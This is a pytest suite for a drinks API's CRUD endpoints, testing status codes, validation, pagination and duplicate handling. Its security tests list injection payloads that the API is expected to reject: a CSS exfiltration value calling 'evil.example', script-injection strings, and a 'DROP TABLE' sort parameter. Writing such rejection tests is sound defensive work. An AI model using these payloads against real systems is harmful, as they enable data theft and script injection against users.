"""Behaviour of the five drink endpoints.

Covers the specified contract -- status codes, response shapes, the 404 on a
missing id -- and then the edges that a specification leaves implicit: a
duplicate title, a recipe that is not a list, a body that is not JSON, a
`parts` value of ``True``.
"""

from __future__ import annotations

import json

import pytest

from src.database.models import Drink


class TestListDrinks:
    """GET /drinks is public and returns the short representation."""

    def test_empty_menu_is_a_success_not_a_404(self, client):
        response = client.get("/drinks")
        assert response.status_code == 200
        assert response.get_json() == {"success": True, "drinks": [], "total": 0}

    def test_lists_every_drink(self, client, make_drink):
        make_drink("Americano")
        make_drink("Cortado")
        body = client.get("/drinks").get_json()
        assert body["success"] is True
        assert {drink["title"] for drink in body["drinks"]} == {
            "Americano",
            "Cortado",
        }

    def test_short_form_shape(self, client, existing_drink):
        drink = client.get("/drinks").get_json()["drinks"][0]
        assert set(drink) == {"id", "title", "recipe"}
        assert drink["recipe"][0] == {"color": "#2ec4f1", "parts": 1}

    def test_search_filters_by_title(self, client, make_drink):
        make_drink("Flat White")
        make_drink("Cold Brew")
        body = client.get("/drinks?search=flat").get_json()
        assert [drink["title"] for drink in body["drinks"]] == ["Flat White"]

    def test_search_wildcards_are_escaped(self, client, make_drink):
        # A caller must not be able to pass '%' and match the whole table.
        make_drink("Flat White")
        body = client.get("/drinks?search=%25").get_json()
        assert body["drinks"] == []

    def test_sorting(self, client, make_drink):
        make_drink("Zebra Mocha")
        make_drink("Americano")
        titles = [
            drink["title"]
            for drink in client.get("/drinks?sort=title&order=desc").get_json()[
                "drinks"
            ]
        ]
        assert titles == ["Zebra Mocha", "Americano"]

    def test_invalid_sort_is_400(self, client):
        response = client.get("/drinks?sort=; DROP TABLE drink")
        assert response.status_code == 400
        assert "sort must be one of" in response.get_json()["message"]

    def test_pagination_is_opt_in(self, client, make_drink):
        for index in range(5):
            make_drink("Drink {0}".format(index))

        unpaged = client.get("/drinks").get_json()
        assert "pagination" not in unpaged
        assert len(unpaged["drinks"]) == 5

        paged = client.get("/drinks?page=2&per_page=2").get_json()
        assert len(paged["drinks"]) == 2
        assert paged["pagination"] == {
            "page": 2,
            "per_page": 2,
            "total": 5,
            "total_pages": 3,
        }

    @pytest.mark.parametrize(
        "query", ["page=0", "page=-1", "per_page=0", "per_page=1000", "page=abc"]
    )
    def test_bad_pagination_is_400(self, client, query):
        assert client.get("/drinks?" + query).status_code == 400


class TestGetOneDrink:
    """GET /drinks/<id> is a public convenience route."""

    def test_returns_the_drink(self, client, existing_drink):
        body = client.get("/drinks/{0}".format(existing_drink.id)).get_json()
        assert body["drinks"][0]["title"] == "Test Latte"

    def test_missing_id_is_404(self, client):
        response = client.get("/drinks/9999")
        assert response.status_code == 404
        assert response.get_json() == {
            "success": False,
            "error": 404,
            "message": "resource not found",
            "request_id": response.get_json()["request_id"],
        }

    def test_non_integer_id_is_404(self, client):
        assert client.get("/drinks/not-a-number").status_code == 404


class TestDrinksDetail:
    """GET /drinks-detail returns the long representation."""

    def test_long_form_shape(self, client, barista_headers, existing_drink):
        drink = client.get("/drinks-detail", headers=barista_headers).get_json()[
            "drinks"
        ][0]
        assert drink["recipe"][0] == {
            "name": "blue foam",
            "color": "#2ec4f1",
            "parts": 1,
        }


class TestCreateDrink:
    """POST /drinks creates a row and returns it in long form."""

    def test_creates_a_drink(self, client, manager_headers, db_session):
        response = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "Udaci-Spice Latte",
                "recipe": [
                    {"name": "blue foam", "color": "#2ec4f1", "parts": 1},
                    {"name": "espresso", "color": "#4b2e1e", "parts": 2},
                ],
            },
        )
        assert response.status_code == 200
        body = response.get_json()
        assert body["success"] is True
        assert len(body["drinks"]) == 1
        assert body["drinks"][0]["title"] == "Udaci-Spice Latte"
        assert response.headers["Location"] == "/drinks/{0}".format(
            body["drinks"][0]["id"]
        )

        stored = db_session.query(Drink).filter_by(title="Udaci-Spice Latte").one()
        assert json.loads(stored.recipe)[1]["name"] == "espresso"

    def test_title_is_trimmed(self, client, manager_headers):
        body = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "   Spaced Out   ",
                "recipe": [{"name": "water", "color": "blue", "parts": 1}],
            },
        ).get_json()
        assert body["drinks"][0]["title"] == "Spaced Out"

    def test_a_single_ingredient_object_is_accepted(self, client, manager_headers):
        # The Ionic frontend has historically posted a bare object rather
        # than a list; normalising it is kinder than a 422.
        response = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "Single",
                "recipe": {"name": "water", "color": "blue", "parts": 1},
            },
        )
        assert response.status_code == 200
        assert len(response.get_json()["drinks"][0]["recipe"]) == 1

    def test_duplicate_title_is_409(self, client, manager_headers, existing_drink):
        response = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "Test Latte",
                "recipe": [{"name": "water", "color": "blue", "parts": 1}],
            },
        )
        assert response.status_code == 409
        assert "already exists" in response.get_json()["message"]

    @pytest.mark.parametrize(
        ("body", "reason"),
        [
            ({}, "both fields missing"),
            ({"title": "No Recipe"}, "recipe missing"),
            ({"recipe": []}, "title missing"),
            (
                {"title": "", "recipe": [{"name": "w", "color": "blue", "parts": 1}]},
                "empty title",
            ),
            (
                {
                    "title": "x" * 200,
                    "recipe": [{"name": "w", "color": "blue", "parts": 1}],
                },
                "title too long",
            ),
            ({"title": "Empty", "recipe": []}, "no ingredients"),
            ({"title": "Bad", "recipe": "not-json-at-all"}, "recipe not JSON"),
            (
                {"title": "Bad", "recipe": [{"name": "w", "color": "blue"}]},
                "parts missing",
            ),
            (
                {
                    "title": "Bad",
                    "recipe": [{"name": "w", "color": "blue", "parts": "two"}],
                },
                "parts not numeric",
            ),
            (
                {
                    "title": "Bad",
                    "recipe": [{"name": "w", "color": "blue", "parts": 0}],
                },
                "parts zero",
            ),
            (
                {
                    "title": "Bad",
                    "recipe": [{"name": "w", "color": "blue", "parts": -1}],
                },
                "parts negative",
            ),
            (
                {
                    "title": "Bad",
                    "recipe": [{"name": "w", "color": "blue", "parts": True}],
                },
                "parts is a bool",
            ),
            (
                {"title": "Bad", "recipe": [{"name": "", "color": "blue", "parts": 1}]},
                "empty name",
            ),
            (
                {"title": "Bad", "recipe": [{"name": "w", "color": "", "parts": 1}]},
                "empty colour",
            ),
        ],
    )
    def test_invalid_bodies_are_422(self, client, manager_headers, body, reason):
        response = client.post("/drinks", headers=manager_headers, json=body)
        assert response.status_code == 422, "{0} should be rejected".format(reason)
        assert response.get_json()["success"] is False

    def test_non_json_body_is_415(self, client, manager_headers):
        response = client.post(
            "/drinks",
            headers=dict(manager_headers, **{"Content-Type": "text/plain"}),
            data="title=Coffee",
        )
        assert response.status_code == 415

    def test_malformed_json_is_400(self, client, manager_headers):
        response = client.post(
            "/drinks",
            headers=dict(manager_headers, **{"Content-Type": "application/json"}),
            data="{not valid json",
        )
        assert response.status_code == 400

    def test_json_array_body_is_400(self, client, manager_headers):
        response = client.post("/drinks", headers=manager_headers, json=[1, 2, 3])
        assert response.status_code == 400


@pytest.mark.security
class TestRecipeColourValidation:
    """Colours are constrained because the frontend interpolates them into CSS."""

    @pytest.mark.parametrize(
        "color",
        [
            "#fff",
            "#2ec4f1",
            "#2ec4f1ff",
            "rgb(12, 34, 56)",
            "rgba(1,2,3,0.5)",
            "blue",
            "rebeccapurple",
        ],
    )
    def test_accepted_colours(self, client, manager_headers, color):
        response = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "Colour {0}".format(color),
                "recipe": [{"name": "w", "color": color, "parts": 1}],
            },
        )
        assert response.status_code == 200

    @pytest.mark.parametrize(
        "color",
        [
            "red; background: url(https://evil.example/log?c=1)",
            "expression(alert(1))",
            "url(javascript:alert(1))",
            "</style><script>alert(1)</script>",
            "#zzzzzz",
            "rgb(1,2)",
            "var(--leak)",
            "  ",
        ],
    )
    def test_rejected_colours(self, client, manager_headers, color):
        response = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "Bad colour",
                "recipe": [{"name": "w", "color": color, "parts": 1}],
            },
        )
        assert response.status_code == 422

    def test_oversized_recipe_is_rejected(self, client, manager_headers):
        response = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "Too many",
                "recipe": [
                    {"name": "ingredient {0}".format(i), "color": "blue", "parts": 1}
                    for i in range(50)
                ],
            },
        )
        assert response.status_code == 422
        assert "20 ingredients or fewer" in response.get_json()["message"]

    def test_oversized_body_is_rejected(self, client, manager_headers):
        # MAX_CONTENT_LENGTH stops this before the JSON is even parsed.
        response = client.post(
            "/drinks",
            headers=manager_headers,
            json={
                "title": "Huge",
                "recipe": [{"name": "x" * 400_000, "color": "blue", "parts": 1}],
            },
        )
        assert response.status_code in (413, 422)


class TestUpdateDrink:
    """PATCH /drinks/<id> applies a partial update."""

    def test_updates_the_title_only(self, client, manager_headers, existing_drink):
        original_recipe = existing_drink.recipe_json()
        body = client.patch(
            "/drinks/{0}".format(existing_drink.id),
            headers=manager_headers,
            json={"title": "Renamed Latte"},
        ).get_json()
        assert body["drinks"][0]["title"] == "Renamed Latte"
        assert body["drinks"][0]["recipe"] == original_recipe

    def test_updates_the_recipe_only(self, client, manager_headers, existing_drink):
        body = client.patch(
            "/drinks/{0}".format(existing_drink.id),
            headers=manager_headers,
            json={"recipe": [{"name": "milk", "color": "#ffffff", "parts": 3}]},
        ).get_json()
        assert body["drinks"][0]["title"] == "Test Latte"
        assert body["drinks"][0]["recipe"] == [
            {"name": "milk", "color": "#ffffff", "parts": 3}
        ]

    def test_missing_id_is_404(self, client, manager_headers):
        response = client.patch(
            "/drinks/4242", headers=manager_headers, json={"title": "Ghost"}
        )
        assert response.status_code == 404

    def test_404_is_checked_before_the_body(self, client, manager_headers):
        # A missing resource is a missing resource, whatever was sent with it.
        response = client.patch("/drinks/4242", headers=manager_headers, json={})
        assert response.status_code == 404

    def test_empty_body_is_422(self, client, manager_headers, existing_drink):
        response = client.patch(
            "/drinks/{0}".format(existing_drink.id),
            headers=manager_headers,
            json={},
        )
        assert response.status_code == 422

    def test_renaming_onto_an_existing_title_is_409(
        self, client, manager_headers, make_drink
    ):
        make_drink("First")
        second = make_drink("Second")
        response = client.patch(
            "/drinks/{0}".format(second.id),
            headers=manager_headers,
            json={"title": "First"},
        )
        assert response.status_code == 409

    def test_an_invalid_recipe_leaves_the_row_untouched(
        self, client, manager_headers, existing_drink, db_session
    ):
        drink_id = existing_drink.id
        response = client.patch(
            "/drinks/{0}".format(drink_id),
            headers=manager_headers,
            json={
                "title": "Renamed",
                "recipe": [{"name": "x", "color": "!!", "parts": 1}],
            },
        )
        assert response.status_code == 422

        db_session.expire_all()
        assert db_session.get(Drink, drink_id).title == "Test Latte"


class TestDeleteDrink:
    """DELETE /drinks/<id> removes the row."""

    def test_deletes_and_reports_the_id(
        self, client, manager_headers, existing_drink, db_session
    ):
        drink_id = existing_drink.id
        response = client.delete(
            "/drinks/{0}".format(drink_id), headers=manager_headers
        )
        assert response.status_code == 200
        body = response.get_json()
        assert body == {"success": True, "delete": drink_id}

        db_session.expire_all()
        assert db_session.get(Drink, drink_id) is None

    def test_missing_id_is_404(self, client, manager_headers):
        assert client.delete("/drinks/4242", headers=manager_headers).status_code == 404

    def test_deleting_twice_is_404_the_second_time(
        self, client, manager_headers, existing_drink
    ):
        path = "/drinks/{0}".format(existing_drink.id)
        assert client.delete(path, headers=manager_headers).status_code == 200
        assert client.delete(path, headers=manager_headers).status_code == 404
